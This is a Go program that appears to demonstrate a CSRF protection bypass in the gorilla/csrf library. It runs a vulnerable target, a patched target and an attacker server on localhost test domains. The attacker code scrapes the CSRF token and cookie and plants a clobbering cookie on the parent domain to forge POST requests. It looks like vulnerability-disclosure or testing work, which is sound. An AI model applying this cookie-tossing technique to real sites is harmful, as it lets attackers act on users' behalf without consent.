package main

import (
	"bytes"
	"crypto/tls"
	_ "embed"
	"encoding/json"
	"flag"
	"fmt"
	"html/template"
	"io"
	"log"
	"net"
	"net/http"
	"net/http/cookiejar"
	"strings"
	"sync"

	safe "csrf/fixed"
	csrf "csrf/vulnerable"

	"golang.org/x/net/publicsuffix"
)

var (
	//go:embed attacker.html
	attackerTemplateBytes []byte
	attackerTemplate      = template.Must(template.New("attacker").Parse(string(attackerTemplateBytes)))

	//go:embed target.html
	targetTemplateBytes []byte
	targetTemplate      = template.Must(template.New("target").Parse(string(targetTemplateBytes)))

	// CLI flags
	domain      = flag.String("domain", "example.test", "domain to use for the demo (bind it, target.$DOMAIN, and attack.$DOMAIN to localhost with /etc/hosts)")
	listen      = flag.String("listen", ":443", "address to listen on")
	tlsCertFile = flag.String("tls-cert", "", "path to TLS certificate file")
	tlsKeyFile  = flag.String("tls-key", "", "path to TLS key file")
)

func main() {
	flag.Parse()
	var ln net.Listener
	var err error

	if *tlsCertFile != "" && *tlsKeyFile != "" {
		crt, err := tls.LoadX509KeyPair(*tlsCertFile, *tlsKeyFile)
		if err != nil {
			log.Fatal(err)
		}

		config := &tls.Config{Certificates: []tls.Certificate{crt}}
		ln, err = tls.Listen("tcp", *listen, config)
		if err != nil {
			log.Fatalf("failed to create listener %v", err)
		}
	} else {
		ln, err = net.Listen("tcp", ":8080")
		if err != nil {
			log.Fatalf("failed to create listener %v", err)
		}
	}

	log.Printf("listening on %s", ln.Addr())

	// vulnerable origin with current gorilla/csrf
	vulnerableOrigin := csrf.Protect([]byte("32-byte-long-auth-key"), csrf.Secure(true))(http.HandlerFunc(targetOriginHandler))
	// safe origin with patched gorilla/csrf
	safeOrigin := safe.Protect([]byte("32-byte-long-auth-key"), safe.Secure(true))(http.HandlerFunc(targetOriginHandler))

	// safe origin with patched gorilla/csrf that permits cross-origin requests
	// from our attacker host
	trustedCrossOrigin := safe.Protect(
		[]byte("32-byte-long-auth-key"),
		safe.Secure(true),
		safe.TrustedOrigins([]string{fmt.Sprintf("attack.%s", *domain)}),
	)(http.HandlerFunc(targetOriginHandler))

	as := newAttackerServer(*domain)

	if err := http.Serve(ln, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case strings.HasPrefix(r.Host, "safe."):
			safeOrigin.ServeHTTP(w, r)
		case strings.HasPrefix(r.Host, "trusted."):
			trustedCrossOrigin.ServeHTTP(w, r)
		case strings.HasPrefix(r.Host, "attack."):
			as.ServeHTTP(w, r)
		case strings.HasPrefix(r.Host, "target."):
			vulnerableOrigin.ServeHTTP(w, r)
		default:
			vulnerableOrigin.ServeHTTP(w, r)
		}
	})); err != nil && err != http.ErrServerClosed {
		log.Fatal(err)
	}
}

func serveTargetHome(w http.ResponseWriter, r *http.Request) {
	data := map[string]any{
		csrf.TemplateTag: csrf.TemplateField(r),
		"CSRFToken":      csrf.Token(r),
		"Domain":         *domain,
	}
	w.Header().Set("Content-Type", "text/html")

	b := bytes.NewBuffer(nil)
	if err := targetTemplate.Execute(b, data); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	if _, err := io.Copy(w, b); err != nil {
		log.Printf("error writing response: %v", err)
		return
	}
}

// serveParams exports the CSRF token and the encoded token to the attacker origin.
// in reality an attacker would scrape the target to obtain these values
func serveParams(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	b := bytes.NewBuffer(nil)
	if err := json.NewEncoder(w).Encode(map[string]string{
		"token": csrf.Token(r),
	}); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	if _, err := io.Copy(w, b); err != nil {
		log.Printf("error writing response: %v", err)
	}
}

func targetOriginHandler(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case "GET":
		switch r.URL.Path {
		case "/":
			serveTargetHome(w, r)
		case "/params.json":
			serveParams(w, r)
		default:
			http.Error(w, "not found", http.StatusNotFound)
		}
	case "POST":
		if r.URL.Path == "/submit" {
			io.WriteString(w, "SUCCESSFUL POST REQUEST")
			return
		}
		http.Error(w, "invalid POST request", http.StatusBadRequest)
	}
}

type attackerServer struct {
	// target to scrape/CSRF attack
	target string
	// current cookie identify to use for CSRF attack
	currentCookie string
	// mutex for scraping target to prevent clobbering identities
	scrapeMutex sync.Mutex
	// client to use for scraping target w/ cookiejar
	client *http.Client
}

func newAttackerServer(target string) *attackerServer {
	jar, err := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List})
	if err != nil {
		log.Fatal(err)
	}
	client := &http.Client{Jar: jar}

	return &attackerServer{
		target:      target,
		client:      client,
		scrapeMutex: sync.Mutex{},
	}
}

func (as *attackerServer) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case "GET":
		as.attackerOriginHandler(w, r)
	default:
		http.Error(w, "invalid method", http.StatusMethodNotAllowed)
	}
}

func (as *attackerServer) attackerOriginHandler(w http.ResponseWriter, _ *http.Request) {
	// make request to the target origin to fetch CSRF token & cookie values
	token, cookie, err := as.scrapeTarget(*domain)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	// set a cookie for the common top-level domain (e.g. example.test)
	// using the exfiltrated CSRF cookie value scraped from the target
	clobberCookie := http.Cookie{
		Name:   "_gorilla_csrf",
		Value:  cookie,
		Path:   "/submit",
		Domain: *domain,
	}
	http.SetCookie(w, &clobberCookie)

	// Set Referrer-Policy to no-referrer to prevent leaking the attacker origin
	// w.Header().Set("Referrer-Policy", "no-referrer")

	// template the attacker page
	w.Header().Set("Content-Type", "text/html")
	data := map[string]any{
		"Domain": *domain,
		"Token":  token,
		"Cookie": cookie,
	}
	b := bytes.NewBuffer(nil)
	if err := attackerTemplate.Execute(b, data); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	if _, err := io.Copy(w, b); err != nil {
		log.Printf("error writing response: %v", err)
		return
	}
}

func (as *attackerServer) scrapeTarget(domain string) (token, cookie string, err error) {
	resp, err := as.client.Get(fmt.Sprintf("https://target.%s/params.json", domain))
	if err != nil {
		return "", "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return "", "", fmt.Errorf("unexpected status code: %d", resp.StatusCode)
	}
	var params struct {
		Token string `json:"token"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&params); err != nil {
		return "", "", err
	}

	// use our current cookie; override if we have been given a new one
	cookie = as.currentCookie
	cookieHeader := resp.Header.Get("Set-Cookie")
	if strings.HasPrefix(cookieHeader, "_gorilla_csrf=") {
		cookieParts := strings.Split(cookieHeader, ";")
		cookieHeader = cookieParts[0]
		cookie = strings.TrimPrefix(cookieHeader, "_gorilla_csrf=")
	}

	if params.Token == "" {
		return "", "", fmt.Errorf("no token found")
	}
	if cookie == "" {
		return "", "", fmt.Errorf("no cookie found")
	}

	// persist cookie for next scrape
	as.currentCookie = cookie

	return params.Token, cookie, nil
}
